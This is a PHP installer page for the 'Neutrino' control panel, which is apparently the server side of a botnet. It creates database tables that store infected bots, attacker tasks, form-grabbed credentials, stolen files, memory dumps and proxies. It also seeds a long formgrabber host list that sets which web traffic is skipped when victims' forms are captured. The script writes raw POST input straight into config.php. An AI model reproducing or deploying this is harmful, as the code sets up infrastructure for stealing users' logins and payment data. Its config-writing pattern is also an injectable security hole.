<?php
header('Content-Type: text/html; charset=utf-8');
define('N3N', 1);

include('config.php');
include('functions.php');
$global_text = null;

$proto = 'http://';
if (array_key_exists('HTTPS', $_SERVER) && $_SERVER['HTTPS'] == 'on') {
    $proto = 'https://';
}

$banned = 'CREATE TABLE IF NOT EXISTS banned (' .
    'id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,' .
    'ip VARCHAR(25) NOT NULL,' .
    'useragent TEXT NOT NULL,' .
    'ref TEXT NOT NULL,' .
    'reason TEXT NOT NULL,' .
    'PRIMARY KEY (id)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci AUTO_INCREMENT=1 ;';

$botnet_tasks = 'CREATE TABLE IF NOT EXISTS botnet_tasks (' .
    'id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,' .
    'task_id TEXT NOT NULL,' .
    'task_date TEXT NOT NULL,' .
    'tasks_pref TEXT NOT NULL,' .
    'command TEXT NOT NULL,' .
    'tasks_postf TEXT NOT NULL,' .
    'status TEXT NOT NULL,' .
    'by_user TEXT NOT NULL,' .
    'execs TEXT NOT NULL,' .
    'needexecs TEXT NOT NULL,' .
    'failed TEXT NOT NULL,' .
    'given TEXT NOT NULL,' .
    'bots TEXT NOT NULL,' .
    'build_id TEXT NOT NULL,' .
    'PRIMARY KEY (id)' .
    ') ENGINE=MyISAM  CHARACTER SET utf8 COLLATE utf8_general_ci AUTO_INCREMENT=272 ;';

$botnet_bots = 'CREATE TABLE IF NOT EXISTS botnet_bots (' .
    'bot_uid VARCHAR(255) NOT NULL DEFAULT \'\',' .
    'bot_os TEXT NOT NULL,' .
    'bot_priv TEXT NOT NULL,' .
    'bot_name TEXT NOT NULL,' .
    'bot_version TEXT NOT NULL,' .
    'bot_ip TEXT NOT NULL,' .
    'bot_av TEXT NOT NULL,' .
    'bot_time TEXT NOT NULL,' .
    'bot_lifetime TEXT NOT NULL,' .
    'bot_date TEXT NOT NULL,' .
    'bot_country TEXT NOT NULL,' .
    'bot_comment TEXT NOT NULL,' .
    'bot_build_id TEXT NOT NULL,' .
    'PRIMARY KEY (bot_uid)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$botnet_ff = 'CREATE TABLE IF NOT EXISTS botnet_ff (' .
    'bot_ip TEXT NOT NULL,' .
    'bot_uid TEXT NOT NULL,' .
    'bot_host TEXT NOT NULL,' .
    'bot_form TEXT NOT NULL,' .
    'bot_form_hash VARCHAR(32) NOT NULL DEFAULT \'\',' .
    'bot_browser TEXT NOT NULL,' .
    'bot_date TEXT DEFAULT NULL,' .
    'bot_time TEXT DEFAULT NULL,' .
    'PRIMARY KEY (bot_form_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$bontet_files = 'CREATE TABLE IF NOT EXISTS botnet_files (' .
    'bot_uid TEXT NOT NULL,' .
    'bot_ip TEXT NOT NULL,' .
    'file_path TEXT NOT NULL,' .
    'file_size INT(11) NOT NULL,' .
    'file_data TEXT NOT NULL,' .
    'file_hash VARCHAR(32) NOT NULL,' .
    'UNIQUE KEY file_hash (file_hash)' .
    ') ENGINE=MyISAM DEFAULT CHARSET=utf8;';

$botnet_proxy = 'CREATE TABLE IF NOT EXISTS botnet_proxy (' .
    'bot_uid TEXT NOT NULL,' .
    'bot_ip VARCHAR(32) NOT NULL,' .
    'bc_ip TEXT NOT NULL,' .
    'bc_port TEXT NOT NULL,' .
    'bot_date TEXT NOT NULL,' .
    'bot_country TEXT NOT NULL,' .
    'proxy_hash VARCHAR(32) NOT NULL,' .
    'PRIMARY KEY (bot_ip)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';
// 'PRIMARY KEY (proxy_hash)' .

$botnet_logs = 'CREATE TABLE IF NOT EXISTS botnet_logs (' .
    'bot_uid TEXT NOT NULL,' .
    'bot_ip TEXT NOT NULL,' .
    'event_name TEXT NOT NULL,' .
    'event_text TEXT NOT NULL,' .
    'event_date_time TEXT NOT NULL,' .
    'event_hash VARCHAR(32) NOT NULL,' .
    'UNIQUE KEY event_hash (event_hash)' .
    ') ENGINE=MyISAM DEFAULT CHARSET=utf8;';

$botnet_plugin = 'CREATE TABLE IF NOT EXISTS botnet_plugin (' .
    'event_name TEXT NOT NULL,' .
    'event_text TEXT NOT NULL,' .
    'event_date_time TEXT NOT NULL,' .
    'event_hash VARCHAR(32) NOT NULL,' .
    'bot_ip TEXT NOT NULL,' .
    'bot_uid TEXT NOT NULL,' .
    'UNIQUE KEY plugin_hash (event_hash)' .
    ') ENGINE=MyISAM DEFAULT CHARSET=utf8;';

$botnet_dumps = 'CREATE TABLE IF NOT EXISTS botnet_dumps (' .
    'bot_uid TEXT NOT NULL,' .
    'bot_ip TEXT NOT NULL,' .
    'track_type TEXT NOT NULL,' .
    'track_data TEXT NOT NULL,' .
    'process_name TEXT NOT NULL,' .
    'bot_date TEXT NOT NULL,' .
    'bot_time TEXT NOT NULL,' .
    'track_hash VARCHAR(32) NOT NULL DEFAULT \'\',' .
    'PRIMARY KEY (track_hash)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$botnet_config = 'CREATE TABLE IF NOT EXISTS botnet_config (' .
    'refresh_id VARCHAR(128) NOT NULL,' .
    'refresh_rate TEXT NOT NULL,' .
    'UNIQUE KEY refresh_id (refresh_id)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$botnet_config_rate = 'INSERT IGNORE INTO botnet_config (refresh_id, refresh_rate) VALUES' .
    '(\'1401076386715766\', \'5\');';

$p_layer = 'CREATE TABLE IF NOT EXISTS p_layer (' .
    'layer_url VARCHAR(128) NOT NULL DEFAULT \'\',' .
    'layer_cktime TEXT NOT NULL,' .
    'layer_ckdate TEXT,' .
    'PRIMARY KEY (layer_url)' .
    ') ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;';

$users = 'CREATE TABLE IF NOT EXISTS users (' .
    'uid VARCHAR(64) DEFAULT NULL,' .
    'username VARCHAR(64) NOT NULL DEFAULT \'\',' .
    'password VARCHAR(64) NOT NULL DEFAULT \'\',' .
    'hash VARCHAR(64) DEFAULT NULL,' .
    'PRIMARY KEY (username)' .
    ') ENGINE=MyISAM  CHARACTER SET utf8 COLLATE utf8_general_ci;';

$admin_config = 'CREATE TABLE IF NOT EXISTS admin_config (' .
    'id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,' .
    'name VARCHAR(70) NOT NULL,' .
    'PRIMARY KEY (id),' .
    'KEY name (name)' .
    ') ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;';

$option_on = 'INSERT IGNORE INTO admin_config (id, name) VALUES' .
    '(1, \'checked\'),' .
    '(2, \'checked\'),' .
    '(3, \'\');';

$ff_host = 'CREATE TABLE IF NOT EXISTS formgrabber_host (' .
    ' id INT(11) NOT NULL,' .
    'hostnames TEXT COLLATE utf8_unicode_ci NOT NULL,' .
    ' block TEXT COLLATE utf8_unicode_ci NOT NULL,' .
    ' UNIQUE KEY id (id)' .
    ') ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;';

$ff_sett = 'INSERT IGNORE INTO formgrabber_host (hostnames, block) VALUES' .
    '(\'capture_all\', \'safebrowsing.google.com\r\nclients1.google.com\r\nclients2.google.com\r\nclients3.google.com\r\nclients4.google.com\r\nocsp.digicert.com\r\nocsp.comodoca4.com\r\nocsp.comodoca.com\r\n.microsoft.com\r\ntiles.services.mozilla.com\r\nservices.mozilla.com\r\n.mcafee.com\r\nvs.mcafeeasap.com\r\nscan.pchealthadvisor.com\r\navg.com\r\nrrs.symantec.com\r\nsjremetrics.java.com\r\nyahoo.com/hjsal	\r\n.msg.yahoo.com\r\ngames.yahoo.com\r\n.toolbar.yahoo.com\r\nquery.yahoo.com\r\nyahoo.com/pjsal\r\neBayISAPI.dll?VISuperSize&item=\r\nbeap.bc.yahoo.com\r\n.mail.yahoo.com/ws/mail/v1/formrpc?appid=YahooMailClassic\r\n.mail.yahoo.com/dc/troubleLoading\r\n.mail.yahoo.com/mc/compose\r\nmail.yahoo.com/mc/showFolder\r\nmail.yahoo.com/mc/showMessage\r\ninstallerstats.yahoo.com\r\nlogin.yahoo.com/openid/op/start\r\nmail.yahoo.com/mc/showFolder\r\nyahoo.com/mc/showMessage\r\nmail.yahoo.com/mc/compose\r\naddress.mail.yahoo.com/yab\r\naddress.yahoo.com\r\nanalytics.yahoo.com\r\ngeo.yahoo.com\r\nnews.yahoo.com\r\nmessages.finance.yahoo.com\r\ninstallerstats.yahoo.com\r\nmail.yahoo.com/ws/\r\nmail.yahoo.com/dc/\r\nsports.yahoo.com\r\nomg.yahoo.com\r\nshine.yahoo.com\r\ndesktop.google\r\ndesign60.weatherbug.com\r\noogle.com/tbproxy/\r\noogle.com/mail/channel/\r\noogle.com/bookmarks\r\ngle-analytics.com/collect\r\nmaps.google\r\nnews.google\r\ngoogleapis.com\r\noogle.com/u/0/\r\noogle.com/u/1/\r\noogle.com/u/2/\r\noogle.com/u/3/\r\noogle.com/u/4/\r\noogle.com/a/\r\noogle.com/b/\r\nogle.com/_/n/\r\nogle.com/_/initialdata\r\noogle.com/_/photos\r\noogle.com/mail/h/\r\noogle.com/mail/u/\r\noogle.com/_/jserror\r\noogle.com/_/diagnostics\r\noogle.com/_/socialgraph\r\noogle.com/_/savetz\r\noogle.com/_/profiles\r\noogle.com/_/og/promos\r\noogle.com/analytics/web/\r\noogle.com/bind\r\noogle.com/client-channel/channel/\r\noogle.com/cloudsearch/\r\noogle.com/document/\r\noogle.com/dr\r\noogle.com/act\r\noogle.com/pref\r\noogle.com/cp\r\noogle.com/drive/\r\noogle.com/o/oauth2/\r\noogle.com/picker/\r\noogle.com/stat\r\noogle.com/spreadsheets/\r\noogle.com/uploadstats\r\noogle.com/upload/\r\noogle.com/talkgadget\r\noogle.com/translate\r\noogle.com/voice/v1/\r\noogle.com/vr\r\noogle.com/_vti_bin\r\napis.google\r\noogle.com/mail/?ui\r\noogle.com/calendar\r\nogle.com/logos/\r\noglevideo.com\r\noglesyndication.com/activeview\r\nreddit.com/api/\r\ngeo.opera.com\r\n.com/do/mail/message/\r\nhttpcs.msg.yahoo.com/\r\npnrws.skype.com/api\r\nmail.aol.com\r\ndailymotion.com/cookie/\r\netsy.com/s2/service/\r\netsy.com/api/\r\netsy.com/people/\r\netsy.com/add_favorite\r\netsy.com/search\r\nconnect.facebook.com/widgets\r\nupload.facebook.com\r\nconnect.facebook.com\r\napi.facebook.com\r\napps.facebook.com\r\ngraph.facebook.com\r\nfacebook.mafiawars.com\r\nfacebook.com/ads/\r\nfacebook.com/alite/push/log.php\r\nfacebook.com/ajax/\r\nfacebook.com/bookmark/\r\nfacebook.com/chat/\r\nfacebook.com/connect/\r\nfacebook.com/checkpoint/\r\nfacebook.com/crop_profile_pic.php\r\nfacebook.com/editnote.php\r\nfacebook.com/ego/feed/\r\nfacebook.com/dialog/\r\nfacebook.com/events/\r\nfacebook.com/friends\r\nfacebook.com/find-friends/\r\nfacebook.com/growth/\r\nfacebook.com/intl/\r\nfacebook.com/logout\r\nfacebook.com/mobile/\r\nfacebook.com/photos/\r\nfacebook.com/video/\r\nfacebook.com/plugins/\r\nfacebook.com/people/\r\nfacebook.com/privacy/selector/\r\nfacebook.com/profile/picture/\r\nfacebook.com/pubcontent/\r\nfacebook.com/requests/friends/ajax/\r\nfacebook.com/residence/\r\nfacebook.com/roadblock/\r\nfacebook.com/stickers/\r\nfacebook.com/search/live_conversation/\r\nfacebook.com/structured_suggestion/\r\nfacebook.com/timeline/\r\nfacebook.com/tr/\r\nfacebook.com/translations/\r\ninstagram.com/query/\r\ninstagram.com/client_action/\r\nflickr.com/fragment\r\nflickr.com/photo\r\nflickr.com/mail/write\r\nflickr.com/groups\r\nflickr.com/services\r\nflickr.com/people/\r\ntwitter.com/logout\r\ntwitter.com/i/\r\nlinkedin.com/lite/\r\nlinkedin.com/connections\r\nlinkedin.com/people/\r\nlinkedin.com/languageSelector\r\nlinkedin.com/home?trk\r\nlinkedin.com/wvmx/\r\nmyspace.com/beacon/\r\nmyspace.com/ajax/\r\nok.ru/app\r\nok.ru/gwtlog\r\nok.ru/?cmd\r\nok.ru/dk\r\nok.ru/feed\r\nok.ru/game\r\nok.ru/profile\r\nok.ru/push\r\nplayer.vimeo.com\r\nsgsapps.com\r\nmyfarmvillage.com\r\napi.connect.facebook.com\r\nupload.youtube.com\r\nyoutube.com/addto_ajax\r\nyoutube.com/annotations\r\nyoutube.com/api/\r\nyoutube.com/channel_ajax\r\nyoutube.com/comment_voting\r\nyoutube.com/comments_ajax\r\nyoutube.com/comment_servlet\r\nyoutube.com/inbox_ajax\r\nyoutube.com/live_stats\r\nyoutube.com/logout\r\nyoutube.com/metadata_ajax\r\nyoutube.com/playlist_video_ajax\r\nyoutube.com/subscription_ajax\r\nyoutube.com/set_awesome\r\nyoutube.com/video_info_ajax\r\nyoutube.com/video_response_upload\r\nyoutube.com/watch_actions_ajax\r\nyoutube.com/watch_fragments_ajax\r\nyoutube.com/watch_promo_ajax\r\nnetzero.net/webmail\r\nnetmail.verizon.com/netmail/driver\r\nverizon.com/webmail/driver\r\nidp.comcast.net/idp\r\noptimum.net/mail/dd\r\nwww.msn.com/?wa=wsignin1.0\r\nusers.storage.live.com/users/\r\naccount.live.com/API/\r\nmail.live.com/mail/mail.fpp\r\nmail.live.com/mail/options\r\nmail.live.com/ol/\r\nmail.live.com/Handlers/\r\nofficeapps.live.com/wv/\r\nlive.com/mail/SilverlightAttachmentUploader\r\nlive.com/c.gif\r\nlive.com/Handlers/\r\ncox.net/dashboard\r\nenhanced.charter.net\r\npost.craigslist.org\r\namazon.com/gp/history/\r\namazon.com/gp/charity/\r\namazon.com/gp/deal/\r\namazon.com/gp/gw/\r\namazon.com/gp/product/\r\namazon.com/gp/redirection/\r\namazon.com/gp/quick-abn-finder/\r\namazon.com/gp/registry/wishlist/\');';

function install($db_hostname, $db_name, $db_username, $db_password, $cp_user, $cp_password)
{
    global $bontet_files, $botnet_proxy, $proto, $global_text, $ff_sett, $banned, $botnet_bots, $botnet_ff, $botnet_logs, $botnet_dumps, $botnet_plugin, $botnet_config, $botnet_config_rate, $botnet_tasks, $p_layer, $users, $admin_config, $option_on, $ff_host;
    $mysqli = new mysqli($db_hostname, $db_username, $db_password, '');

    if ($mysqli->connect_error) {
        $global_text .= $mysqli->connect_error;
        return false;
    }

    $mysqli->query("DROP DATABASE IF EXISTS $db_name");
    if (!$mysqli->query("CREATE DATABASE IF NOT EXISTS $db_name")) {
        $global_text .= $mysqli->error . "<br>" . $mysqli->connect_error;
        return false;
    }

    $mysqli->select_db($db_name);
    if (!$mysqli->query($banned)) {
        $global_text .= '<b>Cant\'t create table "banned" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_proxy)) {
        $global_text .= '<b>Cant\'t create table "$botnet_proxy" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_bots)) {
        $global_text .= '<b>Cant\'t create table "botnet_bots" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_ff)) {
        $global_text .= '<b>Cant\'t create table "botnet_ff" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($bontet_files)) {
        $global_text .= '<b>Cant\'t create table "$botnet_files" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_logs)) {
        $global_text .= '<b>Cant\'t create table "$botnet_logs" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_dumps)) {
        $global_text .= '<b>Cant\'t create table "botnet_dumps" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_plugin)) {
        $global_text .= '<b>Cant\'t create table "botnet_plugin" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_config)) {
        $global_text .= '<b>Cant\'t create table "botnet_config" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_config_rate)) {
        $global_text .= '<b>Cant\'t insert table "botnet_config - rate" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($botnet_tasks)) {
        $global_text .= '<b>Cant\'t create table "botnet_tasks" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($p_layer)) {
        $global_text .= '<b>Cant\'t create table "p_layer" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($users)) {
        $global_text .= '<b>Cant\'t create table "users" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($admin_config)) {
        $global_text .= '<b>Cant\'t insert table "formgrabber_enabled" : </b>' . $mysqli->error;
        return false;
    }
    if (!$mysqli->query($option_on)) {
        $global_text .= '<b>Cant\'t insert table "ff_on" : </b>' . $mysqli->error;
        return false;
    }
    if (!$mysqli->query($ff_host)) {
        $global_text .= '<b>Cant\'t insert table "ff_host" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($ff_sett)) {
        $global_text .= '<b>Cant\'t insert table "ff_host" : </b>' . $mysqli->error;
        return false;
    }

    if (!$mysqli->query($ff_sett)) {
        $global_text .= '<b>Cant\'t insert table "$ff_sett" : </b>' . $mysqli->error;
        return false;
    }

    if (!register($mysqli, $cp_user, $cp_password, 'admin')) {
        return false;
    }
    $mysqli->close();

    $config_file = 'config.php';
    $config_data =
        PHP_EOL . '// Connection data' . PHP_EOL .
        '$db_host = \'' . $_POST['dbhost'] . '\';' . PHP_EOL .
        '$db_login = \'' . $_POST['dbuser'] . '\';' . PHP_EOL .
        '$db_password = \'' . $_POST['dbpass'] . '\';' . PHP_EOL .
        '$db_database = \'' . $_POST['dbname'] . '\';' . PHP_EOL .
        '$key_tologin = \'' . $_POST['key'] . '\';' . PHP_EOL .
        '// Connection data';


    if (!is_writable($config_file)) {
        $global_text .= '<b>\'config.php\'is not writable!</b>';
        return false;
    }

    $f = fopen('config.php', 'a');
    fwrite($f, $config_data . PHP_EOL);
    fclose($f);

    $global_text .=
        '<b>Login</b> - <i>' . $cp_user . '</i>' .
        '<br><b>Password</b> - <i>' . htmlspecialchars($cp_password) . '</i><br>' .
        '<br><b>Login page</b> - <i>' . $proto . implode('/', array_slice(explode('/', $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF']), 0, -1)) . '/index.php?authkey=' . $_POST['key'] . '</i>' .
        '<br><b>Build path</b> - <i>' . $proto . implode('/', array_slice(explode('/', $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF']), 0, -1)) . '/tasks.php<br></i>' .
        '<br>Delete this file! (install.php)' .
        '<br>';

    return true;
}

function perm_check($object)
{
    if (is_writable($object)) {
        return '<b> * <i>\'' . $object . '\'</i><font color="green"> - ok, is writable.</font></b><br>';
    } else {
        return '<b> * <i>\'' . $object . '\'</i><font color="red"> - is not writable! Need set writable permissions.</font></b><br>';
    }
}

$t_username = array_key_exists('cpuser', $_POST) ? $_POST['cpuser'] : '';
$t_password = array_key_exists('cppass', $_POST) ? $_POST['cppass'] : '';

$t_dbhost = array_key_exists('dbhost', $_POST) ? $_POST['dbhost'] : '';
$t_dbname = array_key_exists('dbname', $_POST) ? $_POST['dbname'] : '';
$t_dbuser = array_key_exists('dbuser', $_POST) ? $_POST['dbuser'] : '';
$t_dbpass = array_key_exists('dbpass', $_POST) ? $_POST['dbpass'] : '';
$t_seckey = array_key_exists('key', $_POST) ? $_POST['key'] : '';

$mysql_version = '<font color="red"> - fail! ( \'shell_exec\' disabled )</font>';
if (is_func_enabled('shell_exec')) {
    $mysql_version = mysql_v();
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
    <title></title>

    <meta http-equiv="Content-Type" content="text/html; charset=utf8"/>
    <script type='text/javascript' src="//code.jquery.com/jquery-1.12.0.min.js"></script>
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="./css/custom.css">

    <script type="text/javascript" src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="./js/bootbox.js"></script>
</head>
<body>
<br>

<div class="panel panel-primary" style="width: 60%;margin: 0 auto; text-align: center">
    <div class="panel-heading">Neutrino installer</div>
    <div class="panel-body">
        <form method="POST" onsubmit="return checkForm(this)"
              action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">

            <div class="list-group">
                    <span class="list-group-item">
                        <h5 class="list-group-item-heading"><i>Control panel</i></h5>
                         <input type="text" style="width: 100%" id="cpuser" class="form-control" name="cpuser"
                                placeholder="Username :" value="<?php echo htmlspecialchars($t_username); ?>"><p></p>
                            <input type="text" style="width: 100%" id="cppass" class="form-control" name="cppass"
                                   placeholder="Password :" value="<?php echo htmlspecialchars($t_password); ?>"><p></p>

                        <input type="text" style="width: 100%" id="key" class="form-control" name="key"
                               placeholder="Secure key (random passphrase) :"
                               onclick="document.getElementById('key').value = Math.random().toString(36).slice(-10)"
                               value="<?php echo htmlspecialchars($t_seckey); ?>">
                    </span>
            </div>

            <div class="list-group">
                    <span class="list-group-item">
                         <h5 class="list-group-item-heading"><i>Database</i></h5>
                        <p></p>
                <input type="text" style="width: 100%" id="dbhost" class="form-control" name="dbhost"
                       placeholder="Database host :" value="<?php echo htmlspecialchars($t_dbhost); ?>"><p></p>

                <input type="text" style="width: 100%" id="dbname" class="form-control" name="dbname"
                       placeholder="Database name :" value="<?php echo htmlspecialchars($t_dbname); ?>"><p></p>

                <input type="text" style="width: 100%" id="dbuser" class="form-control" name="dbuser"
                       placeholder="Database user :" value="<?php echo htmlspecialchars($t_dbuser); ?>"><p></p>

                <input type="text" style="width: 100%" id="dbpass" class="form-control" name="dbpass"
                       placeholder="Database password :" value="<?php echo htmlspecialchars($t_dbpass); ?>"><p></p>
                        </span>
            </div>


            <div class="alert alert-dismissible alert-info" style="text-align:left">

                <?php
                echo '<b>Checking permissions...<b><br>'
                    . perm_check('config.php')
                    . perm_check('files')
                    . perm_check('upload');

                echo '<br><b>Checking MySQL...</b><br>'
                    . '<i> * MySQL version ' . $mysql_version . '</i>';
                if (!check_mysql(mysql_v())) {
                    echo ' - To use search you need installed MySQL 5.6.1 or greater.<br>';
                } else {
                    echo '<font color="green"> - ok</font><br>';
                }

                echo '<i>* MySQLi extension</i>';
                if (!function_exists('mysqli_connect')) {
                    echo "<font color='red'> - Not installed, need install it.</font><br>";
                } else {
                    echo '<font color="green"> - installed</font><br>';
                }

                ?>
            </div>
            <script type="text/javascript">
                function checkForm(form) {
                    if (document.getElementById('dbhost').value == "") {
                        bootbox.alert('Enter the hostname!');
                        return false;
                    }
                    if (document.getElementById('dbname').value == "") {
                        bootbox.alert('Enter the db name!');
                        return false;
                    }
                    if (document.getElementById('dbuser').value == "") {
                        bootbox.alert('Enter the db username!');
                        return false;
                    }
                    if (document.getElementById('key').value == "") {
                        bootbox.alert('Enter the secure key (random passphrase)!');
                        return false;
                    }
                    return true;
                }
            </script>
            <button type="submit" name="install" class="btn btn-primary btn-block">Install</button>
        </form>
    </div>
</div>
<?php
if (array_key_exists('install', $_POST)) {
    if (empty($_POST['dbhost']) || empty($_POST['dbname']) || empty($_POST['dbuser']) || empty($_POST['key']) || empty($_POST['cpuser']) || empty($_POST['cppass']))
        $global_text = 'Please fill in all fields!';
    else
        install($_POST['dbhost'], $_POST['dbname'], $_POST['dbuser'], $_POST['dbpass'], $_POST['cpuser'], $_POST['cppass']);
    if (count($global_text) != 0) {
        echo '<script type="text/javascript">bootbox.alert("<b>Neutrino installer</b><br><br>' . $global_text . '").find("div.modal-dialog").addClass("box-install");</script>';
    }
}
?>
</body>
</html>
